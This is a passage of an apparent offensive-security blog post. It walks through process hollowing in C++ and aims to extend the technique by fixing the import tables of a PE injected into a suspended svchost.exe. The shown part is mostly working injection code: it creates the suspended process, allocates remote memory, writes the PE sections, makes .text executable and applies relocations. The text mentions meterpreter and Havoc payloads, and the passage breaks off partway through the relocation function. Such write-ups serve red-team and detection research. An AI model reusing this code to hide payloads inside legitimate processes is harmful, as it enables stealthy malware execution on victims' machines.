      <li><a href="#copy-pe-in-target-process">Copy PE in target process</a></li>
      <li><a href="#image-base-relocation">Image base Relocation</a></li>
      <li><a href="#changing-the-entrypoint-and-resuming-the-execution">Changing the entrypoint and resuming the execution</a></li>
    </ul>
  </li>
  <li><a href="#make-the-remote-process-load-the-required-libraries">Make the remote process load the required libraries</a>
    <ul>
      <li><a href="#load-an-arbitrary-dll-in-a-remote-process">Load an arbitrary DLL in a remote process</a></li>
      <li><a href="#resolve-injected-pe-iat-to-make-the-remote-process-load-all-the-dependencies">Resolve injected PE IAT to make the remote process load all the dependencies</a></li>
      <li><a href="#resolve-the-functions-and-libraries-addresses-on-the-remote-process">Resolve the functions and libraries addresses on the remote process</a></li>
      <li><a href="#retrieve-the-libraries-and-function-addresses">Retrieve the libraries and function addresses</a></li>
    </ul>
  </li>
  <li><a href="#handle-forwarded-functions-on-remote-process">Handle forwarded functions on remote process</a>
    <ul>
      <li><a href="#definition-of-a-forwarded-function">Definition of a forwarded function</a></li>
      <li><a href="#custom-getprocaddress">Custom GetProcAddress</a></li>
    </ul>
  </li>
  <li><a href="#handle-api-set">Handle API set</a>
    <ul>
      <li><a href="#definition-of-api-sets">Definition of API Sets</a></li>
      <li><a href="#how-to-resolve-api-set-names">How to resolve API set names</a></li>
    </ul>
  </li>
  <li><a href="#final-touch-retrieve-output-of-our-injected-process">Final Touch: Retrieve output of our injected process</a></li>
  <li><a href="#plot-twist">Plot Twist</a></li>
  <li><a href="#references">References</a></li>
</ul>

<h2 id="abstract">Abstract</h2>

<p>When someone is interested  in code injection, he encounters Process Hollowing technic which consists in creating a remote process in a suspended state, write a payload in the remote process memory and overwrite the address of entry point with the address of the payload. A lot of articles on internet explain really well how the technique works and how to implement it in C/C++ using a PE as a payload.</p>

<p>However, all the articles about this technique lack one specific thing: handling the import table of the injected PE. When Local Reflective Execution is performed, it is just needed to iterate over the IAT and delayed IAT to import the needed libraries and resolve the required functions to fix the tables. The purpose of this blog post is to demonstrate how it is possble to fix the IAT and delayed IAT remotely when a PE is injected on a remote process.</p>

<p>This article does not show a new evasion technic but an improvement of an old technic used to inject PE in a remote process.</p>

<h2 id="basic-process-hollowing">Basic Process Hollowing</h2>

<p>This first section is a reminder of how to implement basic process hollowing with a PE without any IAT such as a meterpreter or Havoc payload. The article will not go into deep details about the basic process hollowing process since there are a lot of articles which explains better the technic. I suggest to read the article from <a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations">ired.team about process hollowing</a> if you want to have more details about the basics.<br />
For people who already knows about the process hollowing, I suggest to directly jump to <a href="#make-the-remote-process-load-the-required-libraries">Make the remote process load the libraries required
</a> chapter.</p>

<h3 id="definition">Definition</h3>

<p>Process Hollowing is an injection technique that injects PE payloads into the address space of a remote process. The remote process is often a legitimate process created by the process hollowing implementation.</p>

<p>A typical process hollowing implementation generally creates a suspended process via the CreateProcess WinAPI and then calls NtUnmapViewOfSection to unmap the legitimate process image of the remote process. Once that’s done, NtMapViewOfSection is called to map the PE payload’s binary image instead.</p>

<p><img src="assets/img/posts/20240124/ProcessHollowSchema.png" alt="Process Hollowing" /></p>

<h3 id="start-a-suspended-process">Start a suspended process</h3>

<p>The first step is pretty straightforward. It is to create a process in a suspended state. The process needs to have the same architecture as the PE that we want to inject.(x64 PE on x64 process, x86 PE on x86 process, etc.). For the blog post the executable that will be used as the legitimate process will be <code class="language-plaintext highlighter-rouge">svchost.exe</code>.<br />
To create the process, the WinAPI function <code class="language-plaintext highlighter-rouge">CreateProcessA</code> will be used. A little function, which will juste take as arguments, our process name that we want to execute and a pointer to a process information struct which will be initialiazed by the function <code class="language-plaintext highlighter-rouge">CreateProcessA</code>, will be created. The process information structure <code class="language-plaintext highlighter-rouge">pi</code> is used to retrieve the process handle and the main thread handle.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">launchSuspendedProcess</span><span class="p">(</span><span class="n">LPCSTR</span> <span class="n">processName</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// init an empty STARTUP INFO structure required by the function CreateProcessA 
</span>
    <span class="n">STARTUPINFOA</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcessA</span><span class="p">(</span><span class="n">processName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="n">pi</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot create process %s"</span><span class="p">,</span> <span class="n">processName</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Launching process %s with PID: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">processName</span><span class="p">,</span> <span class="n">pi</span><span class="o">-&gt;</span><span class="n">dwProcessId</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">LPCSTR</span> <span class="n">target</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">svchost.exe"</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">launchSuspendedProcess</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<h3 id="loadpe-and-retrieve-nt-headers">LoadPE and Retrieve NT Headers</h3>

<p>For the article, a function to read a PE file from disk and to load it in a byte array is used. Alternatives can be done such as:</p>
<ul>
  <li>embed the PE as a byte array in our code</li>
  <li>retrieve the PE remotely from a web server</li>
</ul>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">loadPEFromDisk</span><span class="p">(</span><span class="n">LPCSTR</span> <span class="n">peName</span><span class="p">,</span> <span class="n">LPVOID</span><span class="o">&amp;</span> <span class="n">peContent</span><span class="p">,</span> <span class="n">PDWORD</span> <span class="n">peSizeReturn</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">hPe</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">hPe</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">peName</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hPe</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="o">!</span><span class="n">hPe</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] Error PE to load does not exist or not enough permission to read file: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="o">*</span><span class="n">peSizeReturn</span> <span class="o">=</span> <span class="n">GetFileSize</span><span class="p">(</span><span class="n">hPe</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] DLL %s loaded</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">peName</span><span class="p">);</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] DLL size: %lu bytes </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">peSizeReturn</span><span class="p">);</span>

    <span class="n">peContent</span> <span class="o">=</span> <span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="o">*</span><span class="n">peSizeReturn</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">peContent</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR in allocating in HEAP</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">hPe</span><span class="p">,</span> <span class="n">peContent</span><span class="p">,</span> <span class="o">*</span><span class="n">peSizeReturn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR copying Dll in HEAP </span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Allocating size of Dll on the HEAP @ 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">peContent</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPe</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR in closing Handle on file %s"</span><span class="p">,</span> <span class="n">peName</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>To perform process hollowing, the injected PE NT Header is needed. <br />
For those who are unfamiliar with PE format, it is suggested to read the really good <a href="https://0xrick.github.io/win-internals/pe1/">serie of articles by 0xrick</a>.</p>

<p>Here a simple function to retrieve the NT Header from the injected PE content.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">retrieveNtHeader</span><span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="o">&amp;</span> <span class="n">ntHeader</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">peContent</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PIMAGE_DOS_HEADER</span> <span class="n">dosHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">peContent</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">dosHeaders</span><span class="o">-&gt;</span><span class="n">e_magic</span> <span class="o">!=</span> <span class="n">IMAGE_DOS_SIGNATURE</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Input file seems to not be a PE</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">ntHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">dosHeaders</span> <span class="o">+</span> <span class="n">dosHeaders</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>

    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Dos Header: 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dosHeaders</span><span class="o">-&gt;</span><span class="n">e_magic</span><span class="p">);</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] NT headers: 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ntHeader</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<h3 id="allocate-memory">Allocate Memory</h3>

<p>Once the suspended process is created and the NT Header retrieved, we need to allocate memory on the remote process to store the payload.<br />
The size of the injected PE image will be used to allocate memory.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">PVOID</span> <span class="n">allocAddrOnTarget</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">allocAddrOnTarget</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>  <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">allocAddrOnTarget</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">_err</span><span class="p">(</span><span class="s">"Error in allocating memory on target process: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Once the memory has been allocated, it is required to compute the offset between the allocation address and the preferred Image Base Address of the PE contained in the OptionalHeaders. This offset will be used to patch the binary during the relocation phase.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">DWORD64</span> <span class="n">DeltaImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">-</span> <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">;</span></code></pre></figure>

<p>On most articles, the allocation is performed on the Image base Address of the legitimate process after beeing unmapped. However it has been preferred to not touch the original memory of process and let the operating system decide where the allocation will be made because, to load missing libraries of the injected PE into the remote process, it is needed to create remote threads. The process crashes when we attempt to create a remote thread when the remote process Image is unmapped. Therefore, it is needed to let untouched the original Image.</p>

<h3 id="copy-pe-in-target-process">Copy PE in target process</h3>

<p>Once the memory has been allocated, it is possible to copy our PE in the target process.<br />
In a first time, it is required to update the ImageBase address in the NT Header with the address of the allocated memory. Once done, the injected PE headers will be copied  in our newly allocated memory.<br />
Then, by iterating over the section headers the content of the sections will be copied inside the allocated memory.<br />
During the relocation phase, the <code class="language-plaintext highlighter-rouge">.reloc</code> section header will be needed, therefore the function that will copy the injected PE will return the section header.<br />
Finaly, the function will change the permission on the <code class="language-plaintext highlighter-rouge">.text</code> section to make it executable.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">copyPEinTargetProcess</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">pHandle</span><span class="p">,</span> <span class="n">LPVOID</span><span class="o">&amp;</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">peInjectNtHeader</span><span class="p">,</span> <span class="n">PIMAGE_SECTION_HEADER</span><span class="o">&amp;</span> <span class="n">peToInjectRelocSection</span><span class="p">)</span>
<span class="p">{</span>

    <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span><span class="p">;</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Writing Header into target process</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfHeaders</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot write headers inside the target process. ERROR Code: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Headers written at : 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">);</span>

    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Writing section into target process</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>


    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">currentSectionHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_SECTION_HEADER</span><span class="p">)((</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">peInjectNtHeader</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_FILE_HEADER</span><span class="p">)</span> <span class="o">+</span> <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">SizeOfOptionalHeader</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_SECTION_HEADER</span><span class="p">)));</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="s">".reloc"</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">peToInjectRelocSection</span> <span class="o">=</span> <span class="n">currentSectionHeader</span><span class="p">;</span>
            <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Reloc table found @ 0x%p offset</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">UINT64</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">peToInjectContent</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span><span class="p">),</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot write section %s in the target process. ERROR Code: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Section %s written at : 0x%p.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">));</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="s">".text"</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">_err</span><span class="p">(</span><span class="s">"Error in changing permissions on .text sections to RX -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Permissions changed to RX on .text section </span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p><img src="assets/img/posts/20240124/CopyPEOutput.png" alt="Copy of PE in the remote process" /></p>

<h3 id="image-base-relocation">Image base Relocation</h3>

<p>Since the PE was loaded to a different address of the image base address referenced in the NT header, it needs to be patched in order for the binary to resolve addresses of different objects like static variables and other absolute addresses which otherwise would no longer work. The way the windows loader knows how to patch the images in memory is by referring to a relocation table residing in the binary.</p>

<p>The process of the relocation phase is:</p>
<ul>
  <li>finding the relocation table and cycling through the relocation blocks</li>
  <li>getting the number of required relocations in each relocation block</li>
  <li>reading bytes in the specified relocation addresses</li>
  <li>applying delta (between source and destination imageBaseAddress) to the values specified in the relocation addresses</li>
  <li>writing the new values at specified relocation addresses</li>
  <li>repeating the above until the entire relocation table is traversed</li>
</ul>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">fixRelocTable</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">pHandle</span><span class="p">,</span> <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">peToInjectRelocSection</span><span class="p">,</span> <span class="n">LPVOID</span><span class="o">&amp;</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">DWORD64</span> <span class="n">DeltaImageBase</span><span class="p">,</span> <span class="n">IMAGE_DATA_DIRECTORY</span> <span class="n">relocationTable</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Fixing relocation table.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">peToInjectRelocSection</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"No Reloc Table</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">DWORD</span> <span class="n">RelocOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">RelocOffset</span> <span class="o">&lt;</span> <span class="n">relocationTable</span><span class="p">.</span><span class="n">Size</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">PBASE_RELOCATION_BLOCK</span> <span class="n">currentReloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBASE_RELOCATION_BLOCK</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">peToInjectContent</span> <span class="o">+</span> <span class="n">peToInjectRelocSection</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span> <span class="o">+</span> <span class="n">RelocOffset</span><span class="p">);</span>
        <span class="n">RelocOffset</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_BASE_RELOCATION</span><span class="p">);</span>
        <span class="n">DWORD</span> <span class="n">NumberOfEntries</span> <span class="o">=</span> <span class="p">(</span><span class="n">currentReloc</span><span class="o">-&gt;</span><span class="n">BlockSize</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_BASE_RELOCATION</span><span class="p">))</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">BASE_RELOCATION_ENTRY</span><span class="p">);</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] Number of relocation: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">NumberOfEntries</span><span class="p">);</span>

        <span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NumberOfEntries</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">PBASE_RELOCATION_ENTRY</span> <span class="n">currentRelocEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBASE_RELOCATION_ENTRY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">peToInjectContent</span> <span class="o">+</span> <span class="n">peToInjectRelocSection</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span> <span class="o">+</span> <span class="n">RelocOffset</span><span class="p">);</span>
            <span class="n">RelocOffset</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">BASE_RELOCATION_ENTRY</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">currentRelocEntry</span><span class="o">-&gt;</span><span class="n">Type</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                <span class="k">continue</span><span class="p">;</span>

            <span class="n">PVOID</span> <span class="n">AddressLocation</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentReloc</span><span class="o">-&gt;</span><span class="n">PageAddress</span> <span class="o">+</span> <span class="n">currentRelocEntry</span><span class="o">-&gt;</span><span class="n">Offset</span><span class="p">;</span>
            <span class="n">PBYTE</span> <span class="n">PatchedAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">AddressLocation</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PatchedAddress</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">nullptr</span><span class="p">))</span>
            <span class="p">{</span>
